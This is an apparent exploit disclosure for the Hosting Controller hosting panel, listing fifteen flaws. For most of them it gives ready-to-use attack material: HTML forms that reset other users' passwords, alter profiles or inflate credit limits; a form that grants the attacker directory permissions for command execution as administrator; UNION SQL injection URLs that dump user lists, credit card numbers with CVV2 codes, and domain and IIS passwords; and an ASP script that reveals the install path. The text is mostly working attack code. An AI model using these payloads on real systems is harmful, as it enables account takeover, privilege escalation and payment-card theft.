1- [Remote Attacker] can login to hosting controller Panel. He can also change all others&#039; passwords:
    1.1- http://[HC URL]/hosting/addreseller.asp?reseller=[USERNAME]  -&gt; for ex. [USERNAME]= resadmin
    1.2- Now, to login without changing the password, attacker must run &quot;ChangeDisplay.htm&quot; then redirect to &quot;main.asp&quot;
        ~~~~~~~~~~~~~~~~1.2.1 ChangeDisplay.htm~~~~~~~~~~~~~~~~~~~~~~~~
            &lt;script&gt;
            function check(){
                _action = &#039;/AdminSettings/displays.asp?DecideAction=1&amp;ChangeSkin=1&#039;
                frmDisplay.action = window.document.all.URL.value + _action
                return true;
            }
            &lt;/script&gt;
            URL: &lt;input type=&quot;text&quot; name=&quot;URL&quot; /&gt;
            &lt;form name=&quot;frmDisplay&quot; action=&quot;&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;TemplateSkin&quot; value=&quot;PanelXP/Blue&quot; /&gt;
            &lt;input type=&quot;submit&quot; /&gt;
            &lt;/form&gt;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    1.3- Attacker, also can change username&#039;s password without having current password by &quot;ChangePass.htm&quot;
        ~~~~~~~~~~~~~~~~1.3.1 ChangePass.htm~~~~~~~~~~~~~~~~~~~~~~~~
            &lt;script&gt;
            function check(){
                _action = &#039;/Accounts/AccountActions.asp?ActionType=UpdateUser&#039;
                frmChangePass.action = window.document.all.URL.value + _action
                return true;
            }
            &lt;/script&gt;
            URL: &lt;input type=&quot;text&quot; name=&quot;URL&quot; /&gt;&lt;br /&gt;
            &lt;form name=&quot;frmChangePass&quot; action=&quot;&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
            UserName: &lt;input type=&quot;text&quot; name=&quot;UserName&quot; value=&quot;[USERNAME]&quot; /&gt; &lt;br /&gt;
            FullName: &lt;input type=&quot;text&quot; name=&quot;FullName&quot; value=&quot;[USERNAME]&quot; /&gt; &lt;br /&gt;
            Description: &lt;input type=&quot;text&quot; name=&quot;Description&quot; value=&quot;Something&quot; /&gt; &lt;br /&gt;
            Password: &lt;input type=&quot;text&quot; name=&quot;Pass1&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
            Confirm Password: &lt;input type=&quot;text&quot; name=&quot;ConfPass&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;DefaultDiscount&quot; value=&quot;0&quot; /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;CreditLimit&quot; value=&quot;0&quot; /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;ActionType&quot; value=&quot;AddUser&quot; /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;PassCheck&quot; value=&quot;TRUE&quot; /&gt;
            &lt;input type=&quot;submit&quot; /&gt;
            &lt;/form&gt;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\\\\\\\\\\\\\\\\\\\\\
/////////////////////

2- [User] can copy a file to hosting controller web directory which is executed under administrator&#039;s privilege, so attacker can execute his commands by
administrator&#039;s privilege. For example attacker can gain remote desktop of server by this way and uploading an ASP file!
This bug is because of &quot;inc_newuser.asp&quot; that can set full control permission on each &quot;db&quot;,&quot;www&quot;,&quot;Special&quot;, or &quot;log&quot; directory on the server.
This part is more complicated than the others, so we describe it more too.
    2.1- We have a username, for ex. ?testuser? for a site like ?testuser.com?
    2.2- Login by &quot;testuser&quot; and its password.
 2.3- Find Hosting Controller setup directory as we wrote it in part 11. (default directory is ?C:\Program Files\Advanced Communications\Hosting
Controller\web\admin\?)
    2.4- Find ?testuser.com? IIS username by uploading a file or by seeing all system user (part 10) or by your experience (username for ?testuser.com?
is always like ?testusercom_web? )
    2.5- Drag &amp; drop &quot;SetPermission.htm&quot; to your current browser&#039;s window (that is logged in Hosting Controller) and fill it.
        ~~~~~~~~~~~~~~~~2.5.1 SetPermission.htm~~~~~~~~~~~~~~~~~~~~~~~~
            &lt;pre&gt;
            This file set full permission on &quot;DB&quot; directory of &quot;forum&quot;
            So you can upload your file there and execute your command with administrator permission.
            &lt;/pre&gt;
            &lt;script language=&quot;javascript&quot;&gt;
            function check(){
                _action = &#039;/accounts/AccountActions.asp?ActionType=AddUser&#039;
                _forumdir = &#039;\\forum|1&#039;
                frmPermission.action = frmPermission.URL.value + _action
                frmPermission.Dirroot.value = frmPermission.hcpath.value + _forumdir
                if(frmPermission.NewName.value.length&gt;20){
                    alert(&#039;Enter a username less than 20 char like ASPNET&#039;);
                    frmPermission.NewName.focus();
                    return false;
                }else return true;
            }
            &lt;/script&gt;
            &lt;form name=&quot;frmPermission&quot; action=&quot;&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
            Site URL: &lt;input type=&quot;text&quot; name=&quot;URL&quot; size=&quot;30&quot;&gt; &lt;font size=&quot;2&quot;&gt;like: http://tesuser.com:8077 or http://testuser.com/admin&lt;/font&gt;&lt;br&gt;
            Username (less than 20): &lt;input type=&quot;text&quot; name=&quot;NewName&quot; size=&quot;30&quot;&gt; &lt;font size=&quot;2&quot;&gt;like: ASPNET or testusercom_web &lt;/font&gt;&lt;br&gt;
            HC Files Path (no back-slash at end): &lt;input type=&quot;text&quot; name=&quot;hcpath&quot; size=&quot;30&quot;&gt; &lt;font size=&quot;2&quot;&gt;like: C:\Program Files\Advanced
Communications\Hosting Controller\web\admin&lt;/font&gt;&lt;br&gt;

            &lt;br&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;Dirroot&quot;&gt;
            &lt;input type=&quot;hidden&quot; value=&quot;db&quot; name=&quot;anything1&quot;&gt;

            &lt;br&gt;
            &lt;input type=&quot;submit&quot; value=&quot;Go!&quot;&gt;
            &lt;input type=&quot;reset&quot; value=&quot;Reset&quot;&gt;
            &lt;/form&gt;

        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    2.6- If you see ?Error: 70500170 : User already exists in either OS or Database.? Means that all the thing are OK!, and your permission has already
set.
    2.7- Now you have a full access to &quot;[HCPATH]\Forum\DB&quot;.
     Note: You can do that with &quot;[HCPATH]\phpBB\phpBB\db&quot; too because there is &quot;db&quot; directory too.
   2.8- So you can upload your command executer there, but you need a file uploader at first on &quot;testuser.com&quot; to upload your command executer on
&quot;[HCPATH]\Forum\DB&quot;.
 2.9- If your permission has not been set correctly, its always because of limitation on making a new user. So you must login with username&#039;s reseller
and make a new plan with making some new user accounts permission then sell it to your username. Also, you can increase your credit amount (part 6) and
buy a plan with a lot of web accounts then select it and do these operation from the first. (Note: This vulnerability works properly and there is no
exception like the others!)

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

3- [Remote Attacker] can make a new user.
    3.1- Goto http://[HC URL]/hosting/default.asp?referral=&quot;http://&quot;
    3.2- Then http://[HC URL]/hosting/selectdomain.asp?htype=HTYPE
    3.3- Then http://[HC
URL]/hosting/addsubsite.asp?reseller=resadmin&amp;loginname=Bugreport&amp;password=something&amp;email=Admin@Bugreport.ir&amp;DomainName=Bugreport.com


\\\\\\\\\\\\\\\\\\\\\
/////////////////////

4- [Remote Attacker] can change all user&#039;s profiles.
 4.1- Use &quot;Change Profiles.htm&quot;
        ~~~~~~~~~~~~~~~~4.1.1 ChangeProfiles.htm~~~~~~~~~~~~~~~~~~~~~~~~
   &lt;script&gt;
            function check(){
                _action = &#039;/Hosting/Addreseller.asp?loginname=ResAdmin&#039;
                frmChangeProfile.action = window.document.all.URL.value + _action
                return true;
            }
            &lt;/script&gt;
            URL: &lt;input type=&quot;text&quot; name=&quot;URL&quot; /&gt;&lt;br /&gt;
            &lt;form name=&quot;frmChangeProfile&quot; action=&quot;&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
                UserName: &lt;input type=&quot;text&quot; name=&quot;loginname&quot; value=&quot;Victim User&quot; /&gt; &lt;br /&gt;
                first name: &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                last name: &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                description: &lt;input type=&quot;text&quot; name=&quot;description&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                company: &lt;input type=&quot;text&quot; name=&quot;company&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                email: &lt;input type=&quot;text&quot; name=&quot;email&quot; value=&quot;User&#039;s Actual Email Address&quot; /&gt; &lt;br /&gt;
                country: &lt;input type=&quot;text&quot; name=&quot;country&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                state: &lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                city: &lt;input type=&quot;text&quot; name=&quot;city&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                address: &lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                phone: &lt;input type=&quot;text&quot; name=&quot;phone&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                fax: &lt;input type=&quot;text&quot; name=&quot;fax&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                zip: &lt;input type=&quot;text&quot; name=&quot;zip&quot; value=&quot;&quot; /&gt; &lt;br /&gt;
                &lt;input type=&quot;submit&quot; /&gt;
            &lt;/form&gt;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Note: &quot;ResAdmin&quot; in &quot;_action&quot; can change to &quot;hcadmin&quot; or an another valid username.
    4.2- Now Goto: http://[HC URL]/hosting/xml_addresellerresult.asp
    4.3- A user can inject a SQL query in &quot;Email&quot; or &quot;Loginname&quot; field to change user&#039;s profile without having his email address too.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

5- [User] can see all the database information by a SQL injection.
 5.1- Some exploits are:
        ~~~~~~~~~~~~~~~~5.1.1 Exploits~~~~~~~~~~~~~~~~~~~~~~~~
            ---See all users
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
Name,FullName,Description,AdminLevel From Admin_List where 1=1 order by name
            ---AdminProp
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
propname,adminname,propvalue,propname From Adminprop where 1=1 order by name
            ---SQL SERVER
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
Databasename,Owner,Loginname,Servername From SQLServer where 1=1 order by name
            ---IISPasswords
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select FolderID,WebsiteID,User,Folder
From IISPasswords where 1=1 order by name
            ---CreditCards
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
creditcardno,expdate,isEncrypted,cvv2 From creditcard where 1=1 order by name
            ---DSN
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select DSNName,DSNOwner,FilePath,Driver
From DSN where 1=1 order by name
            ---Domain Registration
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
domainname,domainpassword,ns1,ns1_IP From DomainRegistration where 1=1 order by name
            ---Domai nRegistration Info
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select
custname,accountlogin,accountpass,authoritytype From DomainRegistrationInfo where 1=1 order by name
            ---GateWays
            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&amp;search=1&amp;sortaction=1&amp;sortfield=name union select creditcardno,CVV2,Amount,expdate
From GateWays where 1=1 order by name
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


\\\\\\\\\\\\\\\\\\\\\
/////////////////////

6- [User] can change his credit amount or increase his discount.
    6.1- User can increase his credit or discount by &quot;ChangeCredit.htm&quot;
            ~~~~~~~~~~~~~~~~6.1.1 ChangeCredit.htm~~~~~~~~~~~~~~~~~~~~~~~~
            &lt;script&gt;
            function check(){
                _action = &#039;/Accounts/AccountActions.asp?ActionType=UpdateUser&#039;
                frmChangePass.action = window.document.all.URL.value + _action
                return true;
            }
            &lt;/script&gt;
            URL: &lt;input type=&quot;text&quot; name=&quot;URL&quot; /&gt;&lt;br /&gt;
            &lt;form name=&quot;frmChangePass&quot; action=&quot;&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
            UserName: &lt;input type=&quot;text&quot; name=&quot;UserName&quot; value=&quot;[USERNAME]&quot; /&gt; &lt;br /&gt;
            FullName: &lt;input type=&quot;text&quot; name=&quot;FullName&quot; value=&quot;[USERNAME]&quot; /&gt; &lt;br /&gt;
            Description: &lt;input type=&quot;text&quot; name=&quot;Description&quot; value=&quot;Something&quot; /&gt; &lt;br /&gt;
            DefaultDiscount: &lt;input type=&quot;text&quot; name=&quot;DefaultDiscount&quot; value=&quot;100&quot; /&gt; &lt;br /&gt;
            CreditLimit: &lt;input type=&quot;text&quot; name=&quot;CreditLimit&quot; value=&quot;9999&quot; /&gt; &lt;br /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;ActionType&quot; value=&quot;AddUser&quot; /&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;PassCheck&quot; value=&quot;False&quot; /&gt;
            &lt;input type=&quot;submit&quot; /&gt;
            &lt;/form&gt;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

7- [User] can uninstall other&#039;s FrontPage extensions.
 7.1- A user can uninstall other&#039;s FrontPage extensions by sending server &quot;host&quot; id (IIS) value to &quot;http://[HC URL]/fp2002/UNINSTAL.asp&quot; by POST method.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

8- [User] can delete all of gateway information.
 8.1- By using &quot;http://[HC URL]/OpenApi/GatewayVariables.asp&quot; directly.
 8.2- Also by a SQL Injection in &quot;http://[HC URL]/OpenApi/GatewayVariables.asp?GateWayID=1 or 1=1 or 1=1&quot;.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

9- [User] can enable or disable pay type.
 9.1- By using &quot;http://[HC URL]/adminsettings/choosetranstype.asp&quot; directly.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

10- [[User] can see all usernames in the server by &quot;fp2000/NEWSRVR.asp&quot;.
 10.1- Some exploits are:
     http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=OWNERNAME&amp;AdminLevel=reseller
        http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=hcadmin&amp;AdminLevel=host
        And for all usernames: http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=&amp;AdminLevel=

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

11- [User] can find Hosting Controller setup directory.
 11.1- This exploit run locally so the url is like: &quot;http://localhost:8077/hosting/css.asp?AutoHost=resadmin&#039;&quot;
 11.2- To see it locally you can use &quot;FindMap.asp&quot;
            ~~~~~~~~~~~~~~~~11.2.1 FindMap.asp~~~~~~~~~~~~~~~~~~~~~~~~
                &lt;%@LANGUAGE=&quot;VBSCRIPT&quot; CODEPAGE=&quot;1252&quot;%&gt;
                &lt;%
                Check = 1 &#039; Change to 1,2,3,4 if you can&#039;t get the proper answer

                If Check =1 then
                &#039;-------------------------------------------------------------------------
                    Set xml = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot;)
                    xml.Open &quot;Get&quot;, &quot;http://127.0.0.1:8077/hosting/css.asp?AutoHost=resadmin&#039;&quot;, False
                &#039;-------------------------------------------------------------------------
                ElseIf Check =2 Then
                &#039;-------------------------------------------------------------------------
                    Set xml = Server.CreateObject(&quot;Microsoft.XMLHTTP&quot;)
                    xml.Open &quot;Get&quot;, &quot;http://localhost:8077/hosting/css.asp?AutoHost=resadmin&#039;&quot;, False
                &#039;-------------------------------------------------------------------------
                ElseIf Check =3 Then
                &#039;-------------------------------------------------------------------------
                    Set xml = Server.CreateObject(&quot;MSXML2.XMLHTTP&quot;)
                    xml.Open &quot;Get&quot;, &quot;http://127.0.0.1:8077/hosting/css.asp?AutoHost=resadmin&#039;&quot;, False
                &#039;-------------------------------------------------------------------------
                ElseIf Check =4 Then
                &#039;-------------------------------------------------------------------------
                    Set xml = Server.CreateObject(&quot;MSXML2.XMLHTTP&quot;)
                    xml.Open &quot;Get&quot;, &quot;http://localhost:8077/hosting/css.asp?AutoHost=resadmin&#039;&quot;, False
                &#039;-------------------------------------------------------------------------
                End If

                xml.setRequestHeader &quot;lastCached&quot;, now()
                xml.setRequestHeader &quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;
                xml.Send TotalInputPOST
                FileContent = xml.getResponseHeader(&quot;Content-Type&quot;)
                strHtmlContent = xml.responseText
                i = instrrev(strHtmlContent,&quot;../common/SqlInject.asp&quot;)
                j = instrrev(strHtmlContent,&quot;size=2&gt;&quot;,i)
                Response.Write(&quot;&lt;b&gt;&quot;&amp;mid(strHtmlContent,j+7,i-j-15)&amp;&quot;&lt;/b&gt;&quot;)
                %&gt;
                &lt;%set oScriptNet=Server.CreateObject(&quot;Wscript.Network&quot;)%&gt;
                &lt;br /&gt;
                &lt;pre&gt;
                Computer Name: &lt;%=oScriptNet.ComputerName%&gt;
                User: &lt;%=oScriptNet.UserName%&gt;   (You are seeing this page by this user)
                Both: \\&lt;%=oScriptNet.ComputerName%&gt;\\&lt;%=oScriptNet.UserName%&gt;
                User Length=&lt;%If Len(oScriptNet.UserName)&lt;=20 Then Response.Write(&quot; OK :)&quot;) Else Response.Write(&quot; False :( More than 20 chars so you must
use from other username like ASPNET&quot;)%&gt;&lt;/pre&gt;
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

12- [User] can import unwanted plan or change the plans.
 12.1- To import a plan use &quot;http://[HC URL]/hosting/importhostingplans.asp&quot; directly.
    12.2- To change a plan use something like &quot;http://[HC URL]/hosting/AutoSignUpPlans.asp?save=1&amp;30=ON&amp;d_30=1&quot; directly.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

13- [Remote Attacker] can find web site path.
 13.1- When forum is not available, or it is not default, &quot;http://[HC URL]/admin/forum/&quot; shows website path with an error.

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

14- [Remote Attacker] can enable or disable all Hosting Controller forums by SQL Injection.
 14.1- This is because of a SQL Injection in &quot;/forum/HCSpecific/DisableForum.asp&quot; and &quot;/forum/HCSpecific/EnableForum.asp&quot;
     &quot;http://[HC URL]//forum/HCSpecific/DisableForum.asp?action=disableforum&amp;ForumID=1 or 1=1&quot;
  &quot;http://[HC URL]//forum/HCSpecific/DisableForum.asp?action=disableforum&amp;ForumID=1 or 1=1&quot;

\\\\\\\\\\\\\\\\\\\\\
/////////////////////

15- [User] can change other&#039;s host headers.
 15.1- This is because of &quot;/IIS/iibind.asp&quot; which accept the parameter without any checking. Also, this file has potential for dangerous SQL Injection.







